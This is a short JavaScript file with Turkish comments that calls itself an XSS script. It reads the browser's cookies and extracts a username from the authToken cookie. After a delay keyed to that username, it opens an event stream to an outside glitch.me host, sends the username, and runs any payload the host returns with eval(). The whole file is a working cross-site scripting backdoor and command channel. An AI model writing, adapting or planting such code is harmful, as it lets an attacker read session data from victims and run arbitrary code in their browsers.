console.log('XSS scripti yüklendi');

const getUsername = () => {
    const cookies = document.cookie.split(';');
    console.log('Çerezler:', document.cookie);
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            console.log('authToken:', value);
            const decodedUsername = decodeURIComponent(value.split('_')[0]);
            console.log('Decoded Username:', decodedUsername);
            return decodedUsername;
        }
    }
    return null;
};

const username = getUsername();
console.log('Username:', username);

// İlk karaktere göre gecikme hesapla (milisaniye cinsinden)
const calculateDelay = (username) => {
    if (!username) return 0; // Username yoksa hemen bağlan
    const firstChar = username[0].toLowerCase();

    // Özel karakterle başlıyorsa: 1 saniye (1000 ms)
    if (/[^a-z0-9]/.test(firstChar)) return 1000;
    // Sayıyla başlıyorsa: 2 saniye (2000 ms)
    if (/[0-9]/.test(firstChar)) return 2000;
    // Harfle başlıyorsa: a=3 saniye, b=4 saniye, ... z=28 saniye
    if (/[a-z]/.test(firstChar)) {
        const charCode = firstChar.charCodeAt(0) - 'a'.charCodeAt(0); // a=0, b=1, ...
        return (charCode + 3) * 1000; // 3 saniyeden başlar
    }
    return 0; // Varsayılan: hemen bağlan
};

const delay = calculateDelay(username);
console.log(`Bağlantı gecikmesi: ${delay / 1000} saniye`);

// SSE bağlantısını gecikmeli olarak kur
setTimeout(() => {
    const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
    eventSource.onmessage = (event) => {
        console.log('Gelen veri:', event.data);
        const data = JSON.parse(event.data);
        if (data.payload) {
            console.log('Payload çalıştırılıyor:', data.payload);
            eval(data.payload);
        }
    };
    eventSource.onerror = (err) => {
        console.log('SSE hatası! Detay:', err);
    };
    eventSource.onopen = () => {
        console.log('SSE bağlantısı açıldı');
    };
}, delay);
